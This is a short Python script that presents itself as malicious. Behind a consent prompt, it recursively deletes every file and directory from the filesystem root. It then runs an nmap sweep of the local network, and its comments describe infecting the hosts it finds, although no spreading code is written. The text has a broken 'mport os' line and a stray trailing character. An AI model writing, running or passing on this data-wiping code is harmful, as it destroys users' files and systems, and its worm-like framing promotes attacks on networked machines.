# Display a warning message
print("Warning: Running this script may have unintended consequences. Do you wish to proceed?")
response = input("Type 'y' to proceed, or 'n' to cancel: ")

# Check user response
if response.lower() != 'y':
    print("Script execution cancelled.")
    exit()

# Proceed with script execution
print("Executing script...")
mport os
import shutil
import socket
import subprocess

# Function to delete everything on the computer
def delete_everything():
    try:
        # Delete all files and directories on the computer
        for root, dirs, files in os.walk("/"):
            for file in files:
                file_path = os.path.join(root, file)
                os.remove(file_path)
            for dir in dirs:
                dir_path = os.path.join(root, dir)
                shutil.rmtree(dir_path)
    except Exception as e:
        print(f"Failed to delete: {e}")

# Function to search for other computers on the network
def search_network():
    ip_range = "192.168.1.1/24"  # Example IP range, adjust as needed
    process = subprocess.Popen(["nmap", "-sn", ip_range], stdout=subprocess.PIPE)
    output, _ = process.communicate()
    # Parse output to find other computers on the network
    # Connect to found computers and infect them

# Main function to execute the malicious actions
if __name__ == "__main__":
    delete_everything()
    search_network()





i
